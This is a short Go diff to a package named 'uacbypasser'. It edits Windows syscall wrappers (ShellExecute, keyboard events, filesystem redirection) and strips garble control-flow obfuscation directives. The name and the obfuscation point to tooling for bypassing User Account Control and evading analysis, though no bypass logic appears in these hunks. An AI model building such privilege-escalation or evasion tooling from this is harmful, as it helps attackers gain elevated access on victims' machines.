@@ -6,8 +6,8 @@ package uacbypasser
 import (
 	"errors"
 	"syscall"
-//	"unsafe"
-
+	"unsafe"
+//    "unsafeheaders"
 	"golang.org/x/sys/windows"
 )
 
@@ -19,9 +19,9 @@ var (
 	procWow64DisableFsRedirection = kernel32.NewProc("Wow64DisableWow64FsRedirection")
 	procWow64RevertFsRedirection  = kernel32.NewProc("Wow64RevertWow64FsRedirection")
 	procShellExecute              = shell32.NewProc("ShellExecuteW")
+    test = unsafe.Pointer(nil)
 )
 
-//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func WithFsr(f func()) error {
 	if f == nil {
 		return errors.New("nullable function provided")
@@ -37,7 +37,6 @@ func WithFsr(f func()) error {
 	return nil
 }
 
-//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func ShellExecute(lpFile, lpOperation, lpParameters string, lpFlags int32) error {
 	var f16 *uint16
 	var o16 *uint16
@@ -55,7 +54,6 @@ func ShellExecute(lpFile, lpOperation, lpParameters string, lpFlags int32) error
 	return err
 }
 
-//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func KeybdEvent(v0, v1, v2, v3 int32) error {
 	ret, _, _ := procKeyBdEvent.Call(uintptr(v0), uintptr(v1), uintptr(v2), uintptr(v3))
 	if ret != 0 {
